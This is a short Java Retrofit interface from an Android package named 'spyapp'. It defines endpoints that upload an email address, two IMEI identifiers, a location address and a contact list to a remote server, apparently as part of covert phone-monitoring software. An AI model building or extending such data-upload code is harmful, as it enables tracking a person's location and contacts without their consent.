package kkactive_india.in.spyapp;

import kkactive_india.in.spyapp.MainPOJO.MainBean;
import kkactive_india.in.spyapp.contactPOJO.contactBean;
import kkactive_india.in.spyapp.mailPOJO.mailBean;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Headers;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;

public interface Allapi {

    @Multipart
    @POST("mailApi.php")
    Call<mailBean> login (
            @Part("email") String m
    );

    @Multipart
    @Headers({"Content-Type: application/json"})
    @POST("emiApi.php")
    Call<MainBean> main (
            @Part("IMEI1") String m,
            @Part("IMEI2") String n,
            @Part("locationAdd") String o,
            @Body contactBean body
    );
}
